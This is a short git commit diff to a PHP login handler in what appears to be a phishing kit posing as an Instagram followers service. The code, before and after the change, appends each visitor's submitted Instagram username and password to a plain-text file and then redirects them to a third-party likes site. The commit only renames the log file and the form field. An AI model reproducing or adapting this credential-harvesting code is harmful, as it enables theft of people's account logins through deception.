a9f6875e49f4a568209a1f6f5aef4d80f9a8885e
swqidk <itsmariebeatle@gmail.com>
2024-11-18 16:34:15 -0500

    Update login.php

--- .sites/ig_followers/login.php
+++ .sites/ig_followers/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("sgt_pepper018.txt", "Instagram Username: " . $_POST['sgt_pepper018'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://ezlikers.com/');
 exit();
 ?>
